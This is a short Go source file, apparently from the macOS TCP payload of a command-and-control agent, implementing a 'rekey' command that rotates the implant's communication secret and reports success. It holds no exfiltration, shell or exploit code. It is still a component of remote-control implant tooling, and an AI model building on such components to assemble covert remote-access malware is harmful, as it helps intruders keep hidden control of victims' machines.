// server/docker/payloads/TCP_Darwin/action_rekey.go
// Rekey command for TCP agent - simplified version without polling

//go:build darwin
// +build darwin

package main

import (
	"time"
)

type RekeyCommand struct{}

func (c *RekeyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// TCP agents don't use polling like HTTPS agents
	// The rekey process for TCP agents is handled differently:
	// 1. Server sends rekey_required status
	// 2. Agent regenerates secrets using the current seed
	// 3. Both sides rotate to new secrets

	// For TCP agents, the actual secret rotation is handled by SecureComms
	// after each message exchange, so this command just acknowledges the request

	if secureComms != nil {
		// Force a secret rotation
		secureComms.RotateSecret()
	}

	return CommandResult{
		Output:      Succ(S5),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
